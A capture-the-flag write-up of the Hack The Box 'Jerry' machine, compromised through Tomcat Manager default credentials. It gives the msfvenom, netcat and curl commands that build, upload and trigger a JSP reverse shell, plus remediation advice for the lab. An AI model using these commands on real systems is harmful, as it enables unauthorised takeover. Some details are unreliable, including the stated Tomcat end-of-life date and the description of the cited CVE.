# HackTheBox - Jerry
Difficulty: Easy | OS: Windows | Points: 20
Date Completed: June 13, 2026 | Author: Lokesh Kaki 
 
## Summary
Jerry is an Easy Windows machine running Apache Tomcat 7.0.88.
The attack path involves: 
- discovering the Tomcat Manager application on port 8080
- logging in using default credentials (tomcat:s3cret)
- deploying a malicious WAR file containing a JSP reverse shell
- obtaining a shell as NT AUTHORITY\SYSTEM (the highest Windows privilege level) - without needing any privilege escalation.
 
## Reconnaissance
Nmap Scan : [ nmap -sC -sV -oN initial.txt 10.10.10.95 ]
            PORT     STATE SERVICE VERSION
            8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
            |_http-title: Apache Tomcat/7.0.88
Only port 8080 is open. The TTL of 127 (from an initial ping) indicates a Windows machine. 
Apache Tomcat 7.0.88 is end‑of‑life and has known vulnerabilities in its Manager interface.

 
## Enumeration
Navigating to http://10.10.10.95:8080 shows the default Tomcat welcome page. 
On the right side, the “Manager App” link points to /manager/html - the WAR deployment interface.
Clicking the link prompts for HTTP Basic Authentication. I tested common default Tomcat credentials:
Username  Password  Result
tomcat	  tomcat    Access Denied
admin	  admin	    Access Denied
tomcat	  s3cret    Access Granted
The credentials tomcat:s3cret are well‑documented for older Tomcat installations. I confirmed programmatically with curl:
[ curl -u 'tomcat:s3cret' http://10.10.10.95:8080/manager/html ]
The response contained <title>Tomcat Web Application Manager</title>, confirming valid Manager access.

 
## Exploitation
### Generating the Payload
1. Using msfvenom, I created a WAR file containing a JSP reverse shell that connects back to my Kali machine (HTB VPN IP on tun0, port 4444).
   [ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war ]
     Starting the Listener
2. Before uploading, I started a netcat listener on my Kali machine:
   [ nc -lvnp 4444 ]
     Uploading the WAR File
3. Tomcat Manager accepts WAR uploads via a simple HTTP PUT‑like request to /manager/text/deploy. I used curl to upload the file:
   [ curl -u 'tomcat:s3cret' -T shell.war 'http://10.10.10.95:8080/manager/text/deploy?path=/shell' ]
     Response: OK - Deployed application at context path [/shell]
4. Triggering the Reverse Shell
   Accessing the deployed application executes the JSP code:
   [ curl http://10.10.10.95:8080/shell/ ]
5. Immediately, the netcat listener received a connection:
    connect to [10.10.14.5] from [10.10.10.95] 49219
    Microsoft Windows [Version 6.3.9600]
    C:\apache-tomcat-7.0.88>
 
## Post-Exploitation
Running 'whoami' confirmed that the shell (cmd) was already running at the highest privilege level:
C:\> [ whoami ]
 nt authority\system

Flags:
Jerry stores both flags in a single text file on the Administrator’s desktop:
C:\> [ type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt" ]
 user.txt
 7004dbcef0f854e0fb401875f26ebd00
 
 root.txt
 04a8b36e1545a455393d067e772fe90e
Both flags were submitted to HackTheBox to mark the machine as owned.
 
## MITRE ATT&CK Mapping
| Phase             | Technique                               | ID        |
|-------------------|-----------------------------------------|-----------|
| Reconnaissance    | Network Service Scanning	              | T1046     |
| Initial Access    | Exploit Public-Facing Application	      | T1190     |
| Execution	    | Command & Scripting Interpreter: JSP    | T1059.007 | 
| Defense Evasion   | Deploy Container (WAR)	              | T1610     |
| Credential Access | Unsecured Credentials: Default Accounts | T1552.001 |
| Discovery	    | System Information Discovery	      | T1082     |

## Vulnerabilities Identified
1. Default Credentials - CVSS 9.8 (Critical)
   The Tomcat Manager was protected only by the default combination tomcat:s3cret. 
   Anyone with network access to port 8080 could gain administrative control.
2. End‑of‑Life Software - CVSS 7.5 (High)
   Apache Tomcat 7.0.88 reached end‑of‑life in 2017 and contains multiple unpatched vulnerabilities, including authentication bypasses (eg: CVE‑2017‑12617).
3. Overprivileged Service Account - CVSS 8.2 (High)
   Tomcat ran as NT AUTHORITY\SYSTEM. 
   Compromising the Manager gave instant full system control without any privilege escalation.

## Remediation
1. Change all default credentials immediately upon deployment. Remove the default tomcat user if not required.
2. Upgrade to a supported Tomcat version (10.x or the latest stable). If an upgrade is impossible, apply all backported security patches.
3. Run Tomcat with least privilege - create a dedicated low‑privilege service account instead of LocalSystem.
4. Restrict Manager access - bind the Manager application to localhost or limit access to trusted IP ranges. In server.xml:
   [ <Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="127\.0\.0\.1" /> ]
5. Enable logging and monitoring - log authentication attempts to the Manager and alert on unexpected successes.
 
## Lessons Learned
1. Default credentials are a gift to attackers. In real engagements, they remain one of the most common findings. Always test them - but more importantly, report them immediately.
2. WAR file deployment as an attack vector requires understanding of Java web applications. The same principle applies to any platform that allows uploading code (PHP, ASPX, etc.).
3. Manual exploitation teaches more than automation. Metasploit would have worked, but building the WAR by hand and using curl to upload it revealed exactly how the exploit works under the hood.

Following the pentest methodology eliminates guesswork. Each phase (Recon -> Enum -> Exploit -> Post‑Exploit) naturally led to the next. There was no “lucky guess” - only systematic enumeration.
